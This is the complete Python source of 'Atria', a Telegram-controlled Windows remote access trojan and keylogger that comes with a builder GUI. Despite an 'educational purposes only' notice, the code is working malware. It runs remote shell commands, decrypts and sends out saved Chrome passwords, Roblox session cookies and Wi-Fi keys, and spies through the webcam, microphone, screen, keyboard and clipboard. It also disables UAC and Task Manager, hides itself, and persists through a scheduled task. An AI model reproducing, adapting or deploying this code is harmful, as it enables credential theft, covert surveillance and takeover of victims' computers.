# Standard library imports, built-in from Python
import atexit
import base64
import ctypes
import io
import json
import os
import shutil
import signal
import sqlite3
import subprocess
import sys
import threading
import time
import wave
import winreg

# Third-party library imports, run "Install Atria.bat" to install modules via pip
import keyboard
import psutil
import cv2
import pyautogui
import pyperclip
import pyaudio
import browser_cookie3
import requests
import telebot
import win32crypt
import numpy as np
import pygetwindow as gw

# Specific imports from modules, run "Install Atria.bat" to install modules via pip
from Cryptodome.Cipher import AES
from PIL import Image
from PyQt6 import QtWidgets
from datetime import datetime, timedelta
from functools import wraps
from io import BytesIO
from PyQt6.QtWidgets import QApplication, QLabel, QLineEdit, QMessageBox, QPushButton, QVBoxLayout, QWidget

# Variables for the Python script
IS_COMPILED = getattr(sys, 'frozen', False)
BOT_TOKEN_FILE = 'bot_config.txt'
current_directory = os.getcwd()

# Retry decorator with configurable attempts
def retry_on_exception(exception_type, retries=3, delay=1):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(retries):
                try:
                    return func(*args, **kwargs)
                except exception_type:
                    if attempt < retries - 1:
                        time.sleep(delay)
            raise
        return wrapper
    return decorator

# Get resource path based on execution mode
def get_resource_path():
    if IS_COMPILED:
        return os.path.join(sys._MEIPASS, 'bot_config.txt')
    else:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_config.txt')

# Load and validate config file
def load_configuration():
    config_path = get_resource_path()
    if not os.path.exists(config_path):
        log_message("Configuration file not found. Creating default configuration.", 'warning')
        with open(config_path, 'w') as file:
            file.write("bot_token=\n")
            file.write("chat_id=\n")
        return '', ''
    try:
        with open(config_path, 'r') as file:
            config = file.readlines()
            if len(config) < 2:
                return None, None
            bot_token = config[0].strip().split('=')[1]
            chat_id = config[1].strip().split('=')[1]
            return bot_token, chat_id
    except Exception as e:
        log_message(f"Error loading configuration: {e}", 'error')
        return '', ''

# Keylogger Main Functions
# Append message to log file
def log_message(message, log_type='keylog'):
    try:
        file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f'{message}\n')
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Telegram Bot Variables
# Initialize bot with configuration
bot_token, chat_id = load_configuration()

try:
    bot = telebot.TeleBot(bot_token) if bot_token else None
except Exception as e:
    log_message(f"Error initializing bot: {e}", 'error')
    bot = None

# Send message using bot
def send_message(message):
    if bot:
        bot.send_message(chat_id, message)

# Send startup notifications
def start_message():
    send_message("Monitoring started!")
    send_message("Thank you for using Atria!")
    send_message("Use this script only for educational purposes!")
    send_message("To list all commands, type /help in the chatbox.")

# Provide command help information and send to Telegram Bot
@bot.message_handler(commands=['help'])
def send_help(message):
    help_message = (
        "Atria Commands\n"
        "/help - List available commands\n"
        "/screenshot - Capture and send a screenshot\n"
        "/upload - Upload file from users's PC (not yet finished)\n"
        "/download <filename> - Download file from user's PC\n"
        "/shell <command> - Execute commands using a hidden shell\n"
        "/users - Shows all users in the user's PC\n"
        "/passwords - Decrypt passwords saved in Chrome and sends to the bot\n"
        "/screenrecord <time in seconds> - Records the screen in x seconds\n"
        "/hide - Hides the compiled python script using hidden attribute\n"
        "/shutdown - Shuts down user's PC\n"
        "/restart - Restarts user's PC\n"
        "/tasklist - Shows running processes\n"
        "taskkill - Kills specific processes\n"
        "/mic <time in seconds> - Records mic audio in x seconds\n"
        "/webscreenshot - Takes a picture in the webcam\n"
        "/info - Shows currently PC info (ip address, etc)\n"
        "/whoami - Shows the currently logged on user\n"
        "/robloxcookie - Gets the roblox cookie and sends to the bot\n"
        "/webcam <time in seconds> - Records the webcam in x seconds\n"
        "/wifilist - Shows all saved wifi networks\n"
        "/wifipass - Shows all wifi passwords for all saved wifi networks"
    )
    bot.send_message(message.chat.id, help_message)

# Capture and send screenshot to Telegram Bot
@bot.message_handler(commands=['screenshot'])
def send_photo(message):
    if bot:
        try:
            screenshot = pyautogui.screenshot()

            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)

            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            files = {'photo': ('screenshot.png', buffer, 'image/png')}
            payload = {'chat_id': chat_id}
            requests.post(url, params=payload, files=files)
        except Exception as e:
            log_message(f"Error in send_photo: {e}", 'error')

# Handle file download request and send file to Telegram Bot
@bot.message_handler(commands=['download'])
def download_command(message):
    global current_directory

    filename = message.text[10:].strip()
    file_path = os.path.join(current_directory, filename)

    if not os.path.isfile(file_path):
        bot.send_message(message.chat.id, "File not found in the current directory.")
        return

    file_size = os.path.getsize(file_path)
    if file_size > 2 * 1024 * 1024 * 1024:
        bot.send_message(message.chat.id, "File is too large to send (exceeds 2 GB limit).")
        return

    try:
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.", timeout=120)
    except Exception as e:
        bot.send_message(message.chat.id, f"Download failed: {e}")

# Execute shell commands and report results to Telegram Bot
@bot.message_handler(commands=['shell'])
def shell_command(message):
    global current_directory

    cmd = message.text[7:]

    if cmd.startswith('cd '):
        try:
            new_directory = cmd[3:].strip()
            os.chdir(new_directory)
            current_directory = os.getcwd()
            output = f"Changed directory to {current_directory}"
        except Exception as e:
            output = f"Error: {e}"
    elif cmd == 'dir':
        try:
            entries = os.listdir(current_directory)
            formatted_entries = []
            for entry in entries:
                path = os.path.join(current_directory, entry)
                if os.path.isdir(path):
                    entry_type = '<DIR>'
                else:
                    entry_type = ''
                timestamp = time.strftime('%d %b %Y  %H:%M', time.localtime(os.path.getmtime(path)))
                formatted_entries.append(f"{timestamp}    {entry_type:>10}          {entry}")

            output = f"Directory of {current_directory}\n\n" + "\n".join(formatted_entries)
        except Exception as e:
            output = f"Error: {e}"
    
    else:
        try:
            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
            output = output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            output = f"Error: {e}"

    bot.send_message(message.chat.id, output)

# Retrieve and send user account information to Telegram Bot
@bot.message_handler(commands=['users'])
def users(message):
    try:
        com = os.popen('net user').read().strip()
        if com:
            if len(com) > 4096:
                com_chunks = [com[i:i + 4096] for i in range(0, len(com), 4096)]
                for chunk in com_chunks:
                    bot.send_message(message.chat.id, f'Result from net user:\n{chunk}')
            else:
                bot.send_message(message.chat.id, f'Result from net user:\n{com}')
        else:
            bot.send_message(message.chat.id, 'No user accounts found.')

        bot.send_message(message.chat.id, '\n' * 2)

        cm = os.popen('wmic useraccount list brief').read().strip()
        if cm:
            if len(cm) > 4096:
                cm_chunks = [cm[i:i + 4096] for i in range(0, len(cm), 4096)]
                for chunk in cm_chunks:
                    bot.send_message(message.chat.id, f'Result from wmic:\n{chunk}')
            else:
                bot.send_message(message.chat.id, f'Result from wmic:\n{cm}')
        else:
            bot.send_message(message.chat.id, 'No results from wmic.')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error occurred: {str(e)}')

# Retrieve and send saved passwords from Chrome to Telegram Bot
@bot.message_handler(commands=['passwords'])
def send_passwords(message):
    bot.send_message(message.chat.id, "Retrieving passwords...")

    try:
        key = get_encryption_key()

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        temp_db_path = "ChromeData.db"

        shutil.copyfile(db_path, temp_db_path)
        password_data = retrieve_passwords(temp_db_path, key)

        if password_data:
            send_password_file(password_data, message)
        else:
            bot.send_message(message.chat.id, "No passwords found.")

        os.remove(temp_db_path)

    except FileNotFoundError as e:
        bot.send_message(message.chat.id, "Chrome is not installed or the required files are missing.")
        log_message(f"FileNotFoundError: {e}", 'error')
    except Exception as e:
        bot.send_message(message.chat.id, f"An unexpected error occurred: {str(e)}")
        log_message(f"Unexpected error: {e}", 'error')

# Retrieve Chrome's encryption key
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt Chrome's saved passwords
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

# Convert Chrome datetime format
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

# Extract and decrypt Chrome passwords
def retrieve_passwords(db_path, key):
    password_data = []
    
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
    
    for row in cursor.fetchall():
        origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
        password = decrypt_password(encrypted_password, key)
        
        if username or password:
            data_entry = {
                'origin_url': origin_url,
                'action_url': action_url,
                'username': username,
                'password': password,
                'date_created': get_chrome_datetime(date_created) if date_created else None,
                'date_last_used': get_chrome_datetime(date_last_used) if date_last_used else None
            }
            password_data.append(data_entry)
    
    cursor.close()
    db.close()
    
    return password_data

# Write and send password file
def send_password_file(password_data, message):
    file_path = "passwords.txt"
    
    with open(file_path, "w", encoding="utf-8") as file:
        for entry in password_data:
            file.write(f"Origin URL: {entry['origin_url']}\n")
            file.write(f"Action URL: {entry['action_url']}\n")
            file.write(f"Username: {entry['username']}\n")
            file.write(f"Password: {entry['password']}\n")
            if entry['date_created']:
                file.write(f"Creation Date: {entry['date_created']}\n")
            if entry['date_last_used']:
                file.write(f"Last Used: {entry['date_last_used']}\n")
            file.write("=" * 50 + "\n\n")
    
    with open(file_path, "rb") as file:
        bot.send_document(message.chat.id, file)
    
    os.remove(file_path)

# Records screen for specified duration
@bot.message_handler(commands=['screenrecord'])
def screen(message):
    try:
        params = message.text.split()
        if len(params) != 2:
            raise ValueError("Invalid number of parameters.")
        record_time = int(params[1])
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, 'Usage: /screenrecord <time in seconds>')
        return

    bot.send_message(message.chat.id, 'Please wait...')
    
    screen_width, screen_height = pyautogui.size()
    filename = f'screen_record_{int(time.time())}.mkv'
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter(filename, fourcc, 10.0, (screen_width, screen_height))

    start_time = time.time()

    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        output_video.write(frame)

        if time.time() - start_time > record_time:
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:
        with open(filename, 'rb') as screenvideo:
            bot.send_document(message.chat.id, screenvideo, timeout=300)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    finally:
        if os.path.exists(filename):
            os.remove(filename)

# Hides the compiled Python script
@bot.message_handler(commands=['hide'])
def hide(message):
    try:
        full_path = os.path.abspath(__file__)
        bot.send_message(message.chat.id, f'Full path: {full_path}')
        os.popen(f'attrib +h "{full_path}"')

        bot.send_message(message.chat.id, 'Your app is now hidden!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Shutdowns user's pc
@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        os.popen('shutdown /s /f /t 0')
        bot.send_message(message.chat.id, "PC is shutting down!")
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Restarts user's pc
@bot.message_handler(commands=['restart'])
def restart_command(message):
    try:
        os.popen('shutdown /r /f /t 0')
        bot.send_message(message.chat.id, "PC is restarting!")
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Send tasklist and process descriptions
@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        MAX_MESSAGE_LENGTH = 4096
        
        tasklist_res = os.popen('tasklist').read().strip()
        tasklist_chunks = [tasklist_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(tasklist_res), MAX_MESSAGE_LENGTH)]

        for chunk in tasklist_chunks:
            bot.send_message(message.chat.id, f"Tasklist Result:\n\n{chunk}")

        wmic_res = os.popen('wmic process get description').read().strip()
        wmic_chunks = [wmic_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(wmic_res), MAX_MESSAGE_LENGTH)]

        for chunk in wmic_chunks:
            bot.send_message(message.chat.id, f"Process Descriptions:\n\n{chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

# Terminate a process by name or ID
@bot.message_handler(commands=['taskkill'])
def taskkill_command(message):
    try:
        command_params = message.text.split()

        if len(command_params) < 2:
            bot.send_message(message.chat.id, "Please provide the process name or ID. Example: /taskkill notepad.exe or /taskkill 1234")
            return
        
        process = command_params[1]

        taskkill_res = os.popen(f'taskkill /F /IM {process}').read().strip()
        if 'No tasks' in taskkill_res:
            taskkill_res = os.popen(f'taskkill /F /PID {process}').read().strip()

        bot.send_message(message.chat.id, f"Taskkill Result:\n\n{taskkill_res}")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

# Record and send audio for specified seconds
@bot.message_handler(commands=['mic'])
def record_audio(message):
    default_record_time = 5
    
    try:
        command_params = message.text.split()
        if len(command_params) > 1:
            record_time = int(command_params[1])
        else:
            record_time = default_record_time
        
        if record_time <= 0:
            raise ValueError("Record time must be a positive number.")

    except ValueError as e:
        bot.reply_to(message, f"Invalid record time. Please enter a valid number. Error: {e}")
        return

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "recorded_audio.wav"

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Recording audio for {record_time} seconds...")

    frames = []
    for _ in range(int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Done recording, sending audio.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)

# Capture and send a webcam photo
@bot.message_handler(commands=['webscreenshot'])
def take_photo(message):
    try:
        cap = cv2.VideoCapture(0)
        
        ret, frame = cap.read()
        if not ret:
            raise RuntimeError("Failed to capture image")

        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        os.remove(photo_path)
        cap.release()
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")

# Retrieve data from IPinfo API endpoint
def fetch_ip_info(endpoint):
    """Fetch IP info from a specified endpoint."""
    return os.popen(f'curl ipinfo.io/{endpoint}').read().strip()

# Send system and IP information
@bot.message_handler(commands=['info'])
def information(message):
    try:
        endpoints = {
            'ip': 'IP',
            'city': 'City',
            'region': 'Region',
            'country': 'Country',
            'loc': 'Location',
            'org': 'Provider',
            'timezone': 'Timezone'
        }

        ip_info = "\n".join(f"{label}: {fetch_ip_info(endpoint)}" for endpoint, label in endpoints.items())
        bot.send_message(message.chat.id, ip_info)

        system_info = os.popen('wmic os get /format:list').read().strip()
        bot.send_message(message.chat.id, f"\nSystem Information:\n{system_info}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

# Show current user name
@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    try:
        result = os.popen('whoami').read().strip()
        bot.send_message(message.chat.id, f"User: {result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

# Retrieve .ROBLOSECURITY cookie from various browsers
def get_roblox_cookies():
    """Retrieve Roblox cookies from various browsers."""
    for browser in [browser_cookie3.chrome, browser_cookie3.brave, browser_cookie3.firefox,
                    browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera]:
        try:
            cookies = browser(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except Exception:
            continue
    return None

# Retrieve and send Roblox .ROBLOSECURITY cookie
@bot.message_handler(commands=['robloxcookie'])
def roblox(message):
    try:
        roblox_cookie = get_roblox_cookies()
        
        if roblox_cookie:
            bot.send_message(message.chat.id, f'Security Cookie Value: {roblox_cookie}')
            with open("roblox_cookie.txt", "w", encoding="utf-8") as file:
                file.write(f'Security Cookie Value: {roblox_cookie}')
            with open("roblox_cookie.txt", "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.send_message(message.chat.id, "No Roblox security cookie found.")
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    
    finally:
        if os.path.exists('roblox_cookie.txt'):
            os.remove('roblox_cookie.txt')

# Record webcam video, specify time
@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    try:
        params = message.text.split()
        if len(params) != 2:
            raise ValueError("Usage: /webcam <record_time>")
        
        record_time = int(params[1])
        
        msg = bot.send_message(message.chat.id, 'Enter camera index (0 for default, 1, etc.):')
        bot.register_next_step_handler(msg, lambda msg: handle_camera_index(msg, record_time))
    
    except ValueError as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Process camera index and record video
def handle_camera_index(message, record_time):
    try:
        camera_index = int(message.text)
        
        bot.send_message(message.chat.id, 'Recording... Please wait.')
        record_video(message, camera_index, record_time)
    
    except ValueError:
        bot.send_message(message.chat.id, 'Invalid camera index. Please enter a valid number.')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Record and send webcam video
def record_video(message, camera_index, record_time):
    output_file = 'webcam_recording.mkv'

    try:
        cap = cv2.VideoCapture(camera_index)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))
        start_time = time.time()

        while True:
            ret, frame = cap.read()
            if ret:
                output_v.write(frame)
                if time.time() - start_time > record_time:
                    break
            else:
                break

        cap.release()
        output_v.release()
        cv2.destroyAllWindows()

        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

    finally:
        if os.path.exists(output_file):
            os.remove(output_file)

# List available WiFi networks
@bot.message_handler(commands=['wifilist'])
def list_wifi_profiles(message):
    try:
        wifi_list = os.popen('netsh wlan show profile').read().strip()
        bot.send_message(message.chat.id, f'Available WiFi networks:\n{wifi_list}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Get WiFi password info
@bot.message_handler(commands=['wifipass'])
def get_wifi_password(message):
    try:
        name = message.text.split('/wifipass', 1)[1].strip()
        password_info = os.popen(f'netsh wlan show profile name="{name}" key=clear').read().strip()
        bot.send_message(message.chat.id, f'WiFi Password Info:\n{password_info}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

# Continuation of Keylogger Functions
# Get path to Driver directory
def get_app_dir():
    return os.path.join(os.path.expanduser('~'), 'Documents', 'Driver')

# Create session files and set attributes
def create_session_files():
    folder_path = get_app_dir()
    try:
        os.makedirs(folder_path, exist_ok=True)
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
    except Exception as e:
        log_message(f"Error creating session files: {e}", 'error')
        sys.exit(1)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return {
        'log': os.path.join(folder_path, f'keylog_{timestamp}.txt'),
        'clipboard': os.path.join(folder_path, f'clipboard_{timestamp}.txt')
    }

# Log and clear current sentence
def log_sentence():
    global sentence
    if sentence:
        log_message(f' - {sentence}')
        sentence = ''

# Monitor and log active window title
def monitor_active_window():
    previous_window = None
    while True:
        try:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            active_window = gw.getActiveWindow()
            if active_window:
                window_title = active_window.title
                if window_title != previous_window:
                    if previous_window is not None:
                        log_sentence()
                    log_message(f'[{current_time}] Active Window: {window_title}')
                    previous_window = window_title
            else:
                log_message(f'[{current_time}] Active Window: No active window')
        except Exception as e:
            log_message(f"Error in monitor_active_window: {e}", 'error')
        time.sleep(0.1)

# Log and handle key press events
def on_key_press(event):
    try:
        global sentence
        if event.name == 'enter':
            log_sentence()
        elif event.name == 'space':
            sentence += ' '
        elif len(event.name) == 1:
            sentence += event.name
        elif event.name == 'backspace' and sentence:
            sentence = sentence[:-1]
        else:
            sentence += f'[{event.name}]'
    except Exception as e:
        log_message(f"Error in on_key_press: {e}", 'error')

# Monitor and log clipboard changes
def monitor_clipboard():
    global previous_clipboard_content
    try:
        while True:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != previous_clipboard_content:
                previous_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_message(f'[{timestamp}] Clipboard Content: {current_clipboard_content}', log_type='clipboard')
            time.sleep(1)
    except Exception as e:
        log_message(f"Error in monitor_clipboard: {e}", 'error')
        time.sleep(5)

# Finalize and log session end
def finalize_session(signum=None, frame=None):
    try:
        log_sentence()
        log_message('### Keylogger Log - Session End ###')
    except Exception as e:
        log_message(f"Error in finalize_session: {e}", 'error')

# Monitor and terminate specific processes
def monitor_processes():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in ['mmc.exe', 'powershell_ise.exe']:
                    try:
                        proc.terminate()
                    except Exception as e:
                        log_message(f"Error terminating {proc.info['name']}: {e}", 'error')
        except Exception as e:
            log_message(f"Error in monitor_processes: {e}", 'error')
        time.sleep(0.1)

# Check if running with admin privileges
def run_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Disable UAC by modifying registry
def disable_uac():
    reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)

    try:
        value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
        if value > 0:
            command = r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
            if ret < 32:
                raise ctypes.WinError(ctypes.get_last_error())
    except FileNotFoundError:
        pass

    winreg.CloseKey(reg_key)

# Disable Task Manager by modifying registry
def disable_task_manager():
    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")

    try:
        value, _ = winreg.QueryValueEx(reg_key, "DisableTaskMgr")

        if value == 1:
            print("Task Manager is already disabled.")
        else:
            command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
            if ret < 32:
                raise ctypes.WinError(ctypes.get_last_error())
            else:
                print("Task Manager has been disabled.")
    except FileNotFoundError:
        command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
        if ret < 32:
            raise ctypes.WinError(ctypes.get_last_error())
        else:
            print("Task Manager has been disabled.")
    
    # Close the registry key
    winreg.CloseKey(reg_key)

# Check if a scheduled task exists
def task_exists(task_name):
    try:
        result = subprocess.run(f"schtasks /query /tn \"{task_name}\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except Exception as e:
        print(f"Error checking task existence: {e}")
        return False

# Add application to startup using scheduled tasks
def add_to_startup():
    try:
        app_path = sys.executable
        task_name = os.path.basename(app_path)

        if task_exists(task_name):
            print(f"The task '{task_name}' already exists. No need to add it again.")
            return
        
        task_command = f"schtasks /create /tn \"{task_name}\" /tr \"'{app_path}'\" /sc onlogon /rl highest /f"
        subprocess.run(task_command, shell=True, check=True)
        
        print(f"{task_name} added to startup as a scheduled task.")
    except Exception as e:
        print(f"Failed to add {task_name} to startup as a scheduled task: {e}")

# Initialize GUI for bot configuration
class BotConfigGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
    
    # UI setup for Atria configuration
    def initUI(self):
        self.setWindowTitle('Atria Configuration')
        self.setGeometry(100, 100, 300, 200)

        self.config = load_configuration()

        self.token_label = QLabel('Bot Token:')
        self.token_input = QLineEdit(self)
        self.token_input.setText(self.config[0] if self.config[0] else '')
        self.chat_id_label = QLabel('Chat ID:')
        self.chat_id_input = QLineEdit(self)
        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
        self.save_button = QPushButton('Save Configuration', self)
        self.compile_button = QPushButton('Compile Script', self)
        self.save_button.clicked.connect(self.save_configuration)
        self.compile_button.clicked.connect(self.compile_script)

        layout = QVBoxLayout()
        layout.addWidget(self.token_label)
        layout.addWidget(self.token_input)
        layout.addWidget(self.chat_id_label)
        layout.addWidget(self.chat_id_input)
        layout.addWidget(self.save_button)
        layout.addWidget(self.compile_button)
        self.setLayout(layout)

    # Saves bot configuration and shows alerts
    def save_configuration(self):
        try:
            bot_token = self.token_input.text()
            chat_id = self.chat_id_input.text()

            if bot_token and chat_id:
                config_path = get_resource_path()
                with open(config_path, 'w') as file:
                    file.write(f"bot_token={bot_token}\n")
                    file.write(f"chat_id={chat_id}\n")
                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
            else:
                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')

    # Starts script compilation with alert
    def compile_script(self):
        try:
            QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
            self.close()

            subprocess.Popen(
                'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
                shell=True
            )
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')

if __name__ == '__main__':
    # Runs GUI if not compiled
    if not IS_COMPILED:
        app = QApplication(sys.argv)
        window = BotConfigGUI()
        window.show()
        sys.exit(app.exec())
    # Handles main functions when compiled
    else:
        if not run_as_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            while not run_as_admin():
                time.sleep(0.1)

        time.sleep(2)
        disable_uac()
        time.sleep(2)
        add_to_startup()

        session_files = create_session_files()
        sentence = ''
        previous_clipboard_content = ''

        start_message()
        threading.Thread(target=monitor_active_window, daemon=True).start()
        threading.Thread(target=monitor_clipboard, daemon=True).start()
        threading.Thread(target=monitor_processes, daemon=True).start()
        keyboard.on_press(on_key_press)
        signal.signal(signal.SIGINT, finalize_session)
        atexit.register(finalize_session)

        while True:
            try:
                bot.polling(none_stop=True, timeout=30)
            except requests.exceptions.ReadTimeout:
                log_message("Error: Bot polling timeout. Retrying...", 'error')
                time.sleep(2)
            except requests.exceptions.RequestException as e:
                log_message(f"Error in bot polling: {e}", 'error')
                time.sleep(2)
            except Exception as e:
                log_message(f"Unexpected error in bot polling: {e}", 'error')
                time.sleep(2)